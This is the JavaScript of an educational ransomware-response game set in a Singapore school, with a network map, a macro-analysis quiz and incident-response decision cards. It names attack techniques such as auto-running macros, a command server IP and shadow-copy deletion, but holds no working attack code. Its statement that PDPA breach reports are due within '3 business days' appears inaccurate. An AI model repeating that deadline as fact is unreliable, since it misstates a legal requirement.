  countdownSecs: 900,
  countdownInterval: null,
};

// ══════════════════════════════════
//  COUNTDOWN TIMER
// ══════════════════════════════════
function startCountdown() {
  gs.countdownInterval = setInterval(() => {
    gs.countdownSecs--;
    if (gs.countdownSecs < 0) gs.countdownSecs = 0;
    const m = Math.floor(gs.countdownSecs / 60);
    const s = gs.countdownSecs % 60;
    document.getElementById('cd-time').textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
    document.getElementById('cd-fill').style.width = (gs.countdownSecs / 900 * 100) + '%';
    if (gs.countdownSecs === 0) clearInterval(gs.countdownInterval);
  }, 1000);
}
startCountdown();

// ══════════════════════════════════
//  STAGE NAV
// ══════════════════════════════════
function goStage(n) {
  document.querySelectorAll('.stage').forEach(s => s.classList.remove('active'));
  document.getElementById('stage' + n).classList.add('active');
  gs.stage = n;
  window.scrollTo({ top: 0, behavior: 'smooth' });

  ['sn1','sn2','sn3'].forEach((id, i) => {
    const el = document.getElementById(id);
    el.classList.remove('active','done');
    if (i + 1 < n) el.classList.add('done');
    else if (i + 1 === n) el.classList.add('active');
  });
}

// ══════════════════════════════════
//  STAGE 1 — NETWORK MAP
// ══════════════════════════════════
const machines = [
  { id: 'LIB-PC-01', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-02', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-03', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-04', user: 'mrazif_admin', status: 'patient-zero', lastFile: 'Invoice_March2026.docm', emailFrom: 'st-supplies-billing@gmail.com ⚠', emailSubj: 'Urgent: March Invoice from ST Supplies Pte Ltd', note: 'Macro executed at 07:02am — PATIENT ZERO' },
  { id: 'LIB-PC-05', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-06', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-07', user: 'student_anon', status: 'infected', lastFile: 'N/A', email: 'N/A', note: 'Infected via network spread' },
  { id: 'LIB-PC-08', user: 'teacher_backup', status: 'clean',   lastFile: 'Lesson_plan.docx', email: 'N/A', note: 'Offline — unplugged at 06:30am' },
];

const statusIcons = { infected: '💀', 'patient-zero': '⚠️', clean: '✅' };
const statusColors = { infected: 'red', 'patient-zero': 'amber', clean: 'green' };

function buildNetworkMap() {
  const grid = document.getElementById('pc-grid');
  machines.forEach((m, i) => {
    const card = document.createElement('div');
    card.className = 'pc-card ' + m.status;
    card.id = 'pc-' + i;
    card.onclick = () => openDrawer(i);
    card.innerHTML = `
      <div class="pc-icon">${statusIcons[m.status]}</div>
      <div class="pc-name">${m.id}</div>
    `;
    grid.appendChild(card);
  });
}
buildNetworkMap();

let currentPcIdx = null;

function openDrawer(idx) {
  const m = machines[idx];
  currentPcIdx = idx;

  document.querySelectorAll('.pc-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('pc-' + idx).classList.add('selected');

  const content = document.getElementById('drawer-content');
  const isPZ = m.status === 'patient-zero';

  content.innerHTML = `
    <div class="drawer-machine-id">// ${m.id} — STATUS: ${m.status.toUpperCase().replace('-',' ')}</div>
    <div class="drawer-row"><span class="dr-key">User:</span><span class="dr-val ${isPZ?'warn':''}">${m.user}</span></div>
    <div class="drawer-row"><span class="dr-key">Last File:</span><span class="dr-val ${isPZ?'crit':''}">${m.lastFile}</span></div>
    ${isPZ ? `<div class="drawer-row"><span class="dr-key">Email From:</span><span class="dr-val warn">${m.emailFrom}</span></div>` : ''}
    ${isPZ ? `<div class="drawer-row"><span class="dr-key">Subject:</span><span class="dr-val">${m.emailSubj}</span></div>` : ''}
    <div class="drawer-row"><span class="dr-key">Note:</span><span class="dr-val ${m.status==='clean'?'ok':isPZ?'warn':'crit'}">${m.note}</span></div>
  `;

  const flagBtn = document.getElementById('flag-pz-btn');
  flagBtn.className = 'btn amber' + (isPZ ? '' : ' disabled');

  const drawer = document.getElementById('status-drawer');
  drawer.style.display = 'block';

  // Mobile overlay
  if (window.innerWidth < 600) {
    document.getElementById('drawer-overlay').style.display = 'block';
  }
}

function closeDrawer() {
  document.getElementById('status-drawer').style.display = 'none';
  document.getElementById('drawer-overlay').style.display = 'none';
}

function flagPatientZero() {
  if (currentPcIdx === null) return;
  const m = machines[currentPcIdx];
  if (m.status !== 'patient-zero') return;

  gs.pzFound = true;
  document.getElementById('flag-pz-btn').textContent = '✓ PATIENT ZERO CONFIRMED';
  document.getElementById('flag-pz-btn').className = 'btn green';

  setTimeout(() => {
    closeDrawer();
    document.getElementById('s1-next').classList.remove('disabled');
  }, 800);
}

// ══════════════════════════════════
//  STAGE 2 — MACRO ANALYSIS
// ══════════════════════════════════
function showMacroCode() {
  document.getElementById('s2-email').classList.remove('active');
  document.getElementById('s2-code').classList.add('active');
}

const annotatable = [1,2,3,4]; // indices of annotatable lines

function toggleCodeLine(idx) {
  const line = document.getElementById('cl' + idx);
  const ann  = document.getElementById('ca' + idx);
  if (!ann) return;

  line.classList.toggle('expanded');
  ann.classList.toggle('visible');

  if (line.classList.contains('expanded') && annotatable.includes(idx)) {
    gs.annotationsOpened.add(idx);
    document.getElementById('annotation-count').textContent = gs.annotationsOpened.size;
    if (gs.annotationsOpened.size >= 4) {
      document.getElementById('quiz-btn').classList.remove('disabled');
    }
  }
}

function showQuiz() {
  document.getElementById('s2-code').classList.remove('active');
  document.getElementById('s2-quiz').classList.add('active');
}

const correctFeedback = [
  null,
  '✓ Correct. AutoOpen() is triggered the instant the document loads — even before the user does anything else. This is why never clicking "Enable Content" on untrusted docs is so important.',
  '✓ Correct. 185.220.101.47 is a Command & Control server — the attacker\'s remote command centre. This same IP appeared in our Case 02 investigation.',
  '✓ Correct. Shadow copies are Windows\'s built-in backup system. Deleting them removes the free restore option, forcing victims to choose: pay ransom or lose everything.',
];
const wrongFeedback = [
  null,
  '✗ Wrong. AutoOpen() runs automatically — it doesn\'t wait for the user to click anything. That\'s what makes it dangerous.',
  '✗ Wrong. This IP belongs to the attacker, not Microsoft or the school. It\'s the machine that takes control of infected computers remotely.',
  '✗ Wrong. Shadow copies are deleted to block the free recovery path, not for storage or antivirus evasion.',
];

const quizAnswered = { 1: false, 2: false, 3: false };

function answerQuiz(el, q, correct) {
  if (quizAnswered[q]) return;
  quizAnswered[q] = true;

  const opts = el.closest('.quiz-opts').querySelectorAll('.quiz-opt');
  opts.forEach(o => { o.style.pointerEvents = 'none'; });

  el.classList.add(correct ? 'correct' : 'wrong');
  if (!correct) {
    opts.forEach(o => { if (o.dataset.correct === 'true') o.classList.add('correct'); });
  }

  const result = document.getElementById('qr' + q);
  result.className = 'quiz-result ' + (correct ? 'correct' : 'wrong');
  result.textContent = correct ? correctFeedback[q] : wrongFeedback[q];
  result.style.display = 'block';

  if (Object.values(quizAnswered).every(Boolean)) {
    setTimeout(() => document.getElementById('s2-next').classList.remove('disabled'), 500);
  }
}

// ══════════════════════════════════
//  STAGE 3 — DECISION CARDS
// ══════════════════════════════════
const decisions = [
  {
    situation: 'The ransom note says: <span class="highlight">"Pay $5,000 in Bitcoin within 24 hours or your files are permanently deleted forever."</span>\nWhat do you do?',
    choices: [
      { text: '💸 Pay the ransom. $5,000 is better than losing everything.', correct: false,
        consequence: '✗ Wrong call. Only 60% of ransomware victims who pay ever get their files back. You\'ve funded the next attack, and there\'s no contract guaranteeing a working key.',
        lesson: 'Always check for backups before considering payment. Never negotiate with ransomware as a first step.' },
      { text: '🔍 Don\'t pay. Investigate backup options first.', correct: true,
        consequence: '✓ Correct. Check for clean backups before any other decision. Paying should always be the absolute last resort.',
        lesson: 'Ransomware gangs know victims are desperate. That\'s their leverage. Your leverage is a clean backup.' },
    ]
  },
  {
    situation: 'The ransomware is still spreading across the school network right now. Every second, more files are encrypted on connected machines.\nWhat is your FIRST move?',
    choices: [
      { text: '🖥️ Keep machines running so students can save their work.', correct: false,
        consequence: '✗ Wrong. Every second the network stays up, the ransomware encrypts more files and spreads to more machines.',
        lesson: 'Speed of isolation matters more than saving ongoing work. Shutdown first, recover later.' },
      { text: '🔌 Disconnect from the internet + shut down school WiFi immediately.', correct: true,
        consequence: '✓ Correct. Isolating the network cuts off both the spread to other machines and the C2 server\'s remote access.',
        lesson: 'Network isolation is always Step 1 in a ransomware response. It limits the blast radius.' },
      { text: '📞 Call the internet provider to report the attack.', correct: false,
        consequence: '✗ Not fast enough. Calling your ISP takes time. The ransomware is spreading right now — isolation comes first.',
        lesson: 'Isolation first. Calls second. CSA hotline is: 1800-323-8899.' },
    ]
  },
  {
    situation: 'You find PC-08 — the teacher\'s backup laptop. It was unplugged from the network at 6:30am, before the attack. The hard drive has last Friday\'s school data.\nWhat do you do?',
    choices: [
      { text: '💾 Restore from this backup.', correct: true,
        consequence: '✓ Correct. An offline backup (physically disconnected) cannot be reached by ransomware. This is your most valuable asset right now.',
        lesson: 'The 3-2-1 backup rule: 3 copies, 2 different media, 1 offsite/offline. Offline backups survive ransomware.' },
      { text: '🛒 Buy a decryption tool from a security vendor first.', correct: false,
        consequence: '✗ Risky and slow. Third-party decryption tools only work for some ransomware variants and often fail. Your backup is more reliable.',
        lesson: 'Use what you have. Check nomoreransom.org for free official decryptors first.' },
    ]
  },
  {
    situation: 'Student data is stored on the school server — names, NRIC numbers, home addresses for over 800 students. The server was encrypted.\n<span class="highlight">Do you need to officially report this to any authority?</span>',
    choices: [
      { text: '🤫 Handle it quietly to protect the school\'s reputation.', correct: false,
        consequence: '✗ Wrong — and illegal. Under PDPA, organisations must report data breaches involving personal data to PDPC within 3 business days.',
        lesson: 'Covering up a breach increases legal liability. PDPC penalties are significant. Transparency protects the school more than silence.' },
      { text: '📱 Yes — report to CSA and PDPC immediately.', correct: true,
        consequence: '✓ Correct. CSA (Cyber Security Agency of Singapore) helps with incident response. PDPC must be notified if personal data was compromised.',
        lesson: 'CSA Hotline: 1800-323-8899. File a report at go.gov.sg/cybercrime. PDPC breach reporting: pdpc.gov.sg' },
    ]
  },
  {
    situation: 'Mr Razif receives a WhatsApp message from an unknown number:\n<span class="highlight">"Hi, I\'m ADMIN_SG. I know what happened to your school. I can sell you the decryption key for $500 SGD via PayNow right now. No need to wait for CSA. Private deal."</span>',
    choices: [
      { text: '💳 Pay $500 via PayNow — it\'s cheaper than $5,000 Bitcoin.', correct: false,
        consequence: '✗ Double scam. This is almost certainly the attacker (or an associate) running a second con. $500 will not produce a working key.',
        lesson: 'Secondary scams targeting ransomware victims are extremely common. Report all contact to CSA.' },
      { text: '🚫 Ignore and report this contact to CSA.', correct: true,
        consequence: '✓ Correct. Block the number and forward the message to CSA. This contact is evidence and may help identify the attacker.',
        lesson: 'The attacker knows you\'re desperate. That\'s their leverage. Don\'t engage — report instead.' },
    ]
  },
];

let currentDecision = 0;
let decisionAnswered = Array(decisions.length).fill(false);
let decisionScore = 0;

function buildDecisions() {
  const arena = document.getElementById('decision-arena');
  decisions.forEach((d, i) => {
    const card = document.createElement('div');
    card.className = 'decision-card' + (i === 0 ? ' active' : '');
    card.id = 'dc-' + i;

    const choicesHTML = d.choices.map((c, ci) =>
      `<div class="dc-choice" onclick="answerDecision(${i}, ${ci}, ${c.correct})" id="dcc-${i}-${ci}">
        <span>${c.text}</span>
      </div>`
    ).join('');

    const consequencesHTML = d.choices.map((c, ci) =>
      `<div class="dc-consequence ${c.correct?'correct':'wrong'}" id="dcon-${i}-${ci}">
        ${c.consequence}
        <span class="lesson">→ ${c.lesson}</span>
      </div>`
    ).join('');

    card.innerHTML = `
      <div class="dc-progress">
        <span>DECISION ${i+1} OF ${decisions.length}</span>
        <span class="num">${i+1}/${decisions.length}</span>
      </div>
      <div class="dc-situation">${d.situation.replace(/\n/g,'<br>')}</div>
      <div class="dc-choices" id="dcc-wrap-${i}">${choicesHTML}</div>
      ${consequencesHTML}
      <div style="padding:10px 16px; display:none;" id="dc-next-${i}">
        <button class="btn amber" onclick="nextDecision(${i})">${i < decisions.length-1 ? '▶ NEXT DECISION →' : '▶ COMPLETE RESPONSE →'}</button>
      </div>
    `;
    arena.appendChild(card);
  });
}
buildDecisions();

function answerDecision(cardIdx, choiceIdx, correct) {
  if (decisionAnswered[cardIdx]) return;
  decisionAnswered[cardIdx] = true;
  if (correct) decisionScore++;

  // Disable all choices in this card
  document.querySelectorAll(`#dcc-wrap-${cardIdx} .dc-choice`).forEach(c => {
    c.style.pointerEvents = 'none';
    c.style.opacity = '0.6';
  });

  const chosen = document.getElementById(`dcc-${cardIdx}-${choiceIdx}`);
  chosen.classList.add(correct ? 'correct' : 'wrong');
  chosen.style.opacity = '1';

  // Show consequence for chosen option
  document.getElementById(`dcon-${cardIdx}-${choiceIdx}`).style.display = 'block';

  // If wrong, also highlight correct
  if (!correct) {
    decisions[cardIdx].choices.forEach((c, ci) => {
      if (c.correct) {
        document.getElementById(`dcc-${cardIdx}-${ci}`).classList.add('correct');
        document.getElementById(`dcc-${cardIdx}-${ci}`).style.opacity = '1';
        document.getElementById(`dcon-${cardIdx}-${ci}`).style.display = 'block';
      }
    });
  }

  document.getElementById(`dc-next-${cardIdx}`).style.display = 'block';
}

function nextDecision(cardIdx) {
  const next = cardIdx + 1;
  document.getElementById('dc-' + cardIdx).classList.remove('active');

  if (next < decisions.length) {
    document.getElementById('dc-' + next).classList.add('active');
    document.getElementById('dc-' + next).scrollIntoView({ behavior: 'smooth', block: 'start' });
  } else {
    // All done
    const fc = document.getElementById('flag-card');
    fc.style.display = 'block';
    fc.scrollIntoView({ behavior: 'smooth', block: 'center' });
    launchConfetti();
    clearInterval(gs.countdownInterval);
  }
}

// ══════════════════════════════════
//  CONFETTI
// ══════════════════════════════════
function launchConfetti() {
  const canvas = document.getElementById('confetti-canvas');
  const ctx = canvas.getContext('2d');
  canvas.style.display = 'block';
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  const colors = ['#ff2244','#ffaa00','#00ff88','#ffffff','#7b2fff'];
  const pieces = Array.from({ length: 70 }, () => ({
    x: Math.random() * canvas.width, y: Math.random() * -canvas.height,
    w: Math.random() * 8 + 4, h: Math.random() * 6 + 3,
    color: colors[Math.floor(Math.random() * colors.length)],
    speed: Math.random() * 3 + 2, angle: Math.random() * Math.PI * 2,
    spin: (Math.random() - 0.5) * 0.2,
  }));
  let frame = 0;
  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    let alive = false;
    pieces.forEach(p => {
      p.y += p.speed; p.angle += p.spin;
      if (p.y < canvas.height + 20) alive = true;
      ctx.save(); ctx.translate(p.x, p.y); ctx.rotate(p.angle);
      ctx.fillStyle = p.color;
      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
      ctx.restore();
    });
    frame++;
    if (alive && frame < 200) requestAnimationFrame(draw);
    else canvas.style.display = 'none';
  }
  draw();
}
</script>
